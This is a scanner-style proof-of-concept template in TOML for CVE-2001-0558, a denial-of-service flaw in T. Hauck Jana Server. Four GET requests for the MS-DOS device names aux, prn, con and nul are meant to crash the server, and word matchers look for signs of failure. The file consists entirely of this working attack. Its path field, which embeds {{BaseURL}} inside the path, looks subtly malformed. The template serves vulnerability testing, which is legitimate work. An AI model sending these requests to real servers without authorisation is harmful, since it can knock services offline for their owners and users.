[info]
author = "AVE"
description = "向T. Hauck Jana Server发送包含MS-DOS设备名(aux/prn/con/nul)的HTTP请求，触发服务器崩溃导致拒绝服务"
id = "POC-AVE-2001-0224"
name = "CVE-2001-0558 PoC"
severity = "medium"
tags = [
    "cve-2001-0558",
    "dos",
    "jana-server",
]
vuln_id = [
    "CVE-2001-0558",
    "AVE-2001-0224",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/aux"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Connection refused",
    "500",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/prn"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Connection refused",
    "500",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/con"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Connection refused",
    "500",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/nul"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "Service Unavailable",
    "Connection refused",
    "500",
]
